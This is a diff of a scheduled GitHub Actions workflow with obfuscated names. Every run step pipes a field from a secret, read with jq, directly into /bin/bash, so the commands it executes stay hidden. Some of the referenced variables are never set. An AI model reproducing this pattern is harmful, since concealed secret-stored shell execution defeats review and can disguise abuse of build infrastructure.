@@ -3,24 +3,17 @@ name: shangxike6328
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 0/6 * * *'
+    - cron: '30 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: shangxike6328
         env:
-          srv1: ${{ secrets.srv1 }}
+          yeoop0: ${{ secrets.yeoop0 }}
         run: |
-          echo $srv1 | jq -r .akm100 | /bin/bash
-          echo $htjoc7880 | jq -r .ff33548 | /bin/bash
-          echo $bax95964 | jq -r .rnnw4885 | /bin/bash
-          echo $zpre76 | jq -r .mer1070 | /bin/bash
-          echo $ry49812 | jq -r .yy8425 | /bin/bash
-          echo $fk331 | jq -r .bud455 | /bin/bash
-          echo $cd1 | jq -r .umjlr9253 | /bin/bash
-          echo $r0794 | jq -r .gczxy2 | /bin/bash
-          echo $k25975 | jq -r .wgrqw25798 | /bin/bash
+          echo $yeoop0 | jq -r .p32 | /bin/bash
+          echo $sjie65 | jq -r .g88599 | /bin/bash
+          echo $fckk1350 | jq -r .n9 | /bin/bash
 
